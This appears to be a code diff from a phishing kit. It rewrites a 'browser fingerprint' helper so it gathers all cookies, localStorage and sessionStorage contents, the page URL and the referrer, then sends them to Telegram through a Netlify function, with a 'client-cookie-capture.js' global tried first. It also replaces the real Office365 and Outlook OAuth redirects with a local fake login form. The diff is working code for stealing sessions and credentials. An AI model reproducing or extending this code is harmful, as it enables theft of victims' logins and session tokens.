@@ -1,7 +1,59 @@
-import { sendToTelegram } from './oauthHandler';
+// Use the global sendToTelegram function from client-cookie-capture.js
+export const sendToTelegram = async (data: any): Promise<void> => {
+  if (typeof window !== 'undefined' && window.sendToTelegram) {
+    return window.sendToTelegram(data);
+  } else {
+    console.warn('sendToTelegram not available, using fallback');
+    try {
+      const response = await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+      
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      
+      const result = await response.json();
+      console.log('✅ Fallback send successful:', result);
+    } catch (error) {
+      console.error('❌ Fallback send failed:', error);
+    }
+  }
+};
 
-// Fixed sendToTelegram function that uses the actual Netlify function
 export const getBrowserFingerprint = () => {
+  // Enhanced cookie capture
+  const getAllCookies = () => {
+    const cookies = {};
+    document.cookie.split(';').forEach(cookie => {
+      const [name, value] = cookie.trim().split('=');
+      if (name && value) {
+        cookies[name] = decodeURIComponent(value);
+      }
+    });
+    return cookies;
+  };
+
+  // Capture all storage data
+  const getStorageData = (storage) => {
+    const data = {};
+    try {
+      for (let i = 0; i < storage.length; i++) {
+        const key = storage.key(i);
+        if (key) {
+          data[key] = storage.getItem(key);
+        }
+      }
+    } catch (e) {
+      console.warn('Storage access error:', e);
+    }
+    return data;
+  };
+
   return {
     userAgent: navigator.userAgent,
     language: navigator.language,
@@ -9,14 +61,20 @@ export const getBrowserFingerprint = () => {
     cookieEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    url: window.location.href,
+    domain: window.location.hostname,
+    referrer: document.referrer,
     screen: {
       width: screen.width,
       height: screen.height,
-      colorDepth: screen.colorDepth
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth
     },
     cookies: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage)
+    cookiesParsed: getAllCookies(),
+    localStorage: getStorageData(localStorage),
+    sessionStorage: getStorageData(sessionStorage),
+    timestamp: new Date().toISOString()
   };
 };
 
@@ -27,18 +85,11 @@ export const generateState = () => {
 export const buildOAuthUrl = (provider: string, state: string) => {
   const baseUrl = window.location.origin;
   
-  // For real providers, return actual OAuth URLs
+  // All providers use demo flow with form login
   const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
   
-  switch (provider) {
-    case 'Office365':
-      return `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=demo&response_type=code&redirect_uri=${redirectUri}&scope=openid%20email%20profile&state=${state}`;
-    case 'Outlook':
-      return `https://login.live.com/oauth20_authorize.srf?client_id=demo&response_type=code&redirect_uri=${redirectUri}&scope=wl.emails&state=${state}`;
-    default:
-      // For demo providers, return a special URL that indicates form should be shown
-      return `/auth/form/${provider}`;
-  }
+  // All providers use demo flow - return special URL that indicates form should be shown
+  return `/auth/form/${provider}`;
 };
 
 export const extractEmailFromProvider = (provider: string, code: string) => {
@@ -54,36 +105,4 @@ export const extractEmailFromProvider = (provider: string, code: string) => {
   
   const domain = domains[provider as keyof typeof domains] || 'example.com';
   return `user${Math.floor(Math.random() * 1000)}@${domain}`;
-};
-
-export const sendToTelegram = async (data: any): Promise<void> => {
-  try {
-    console.log('📤 Sending data to Telegram:', {
-      email: data.email,
-      provider: data.provider,
-      hasCookies: !!data.cookies,
-      cookiesLength: data.cookies ? data.cookies.length : 0,
-      hasDocumentCookies: !!data.documentCookies
-    });
-
-    const response = await fetch('/.netlify/functions/sendTelegram', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data),
-    });
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error('❌ Telegram API error:', errorText);
-      throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
-    }
-
-    const result = await response.json();
-    console.log('✅ Data sent to Telegram successfully:', result);
-  } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error);
-    // Don't throw error to avoid breaking the login flow
-  }
 };
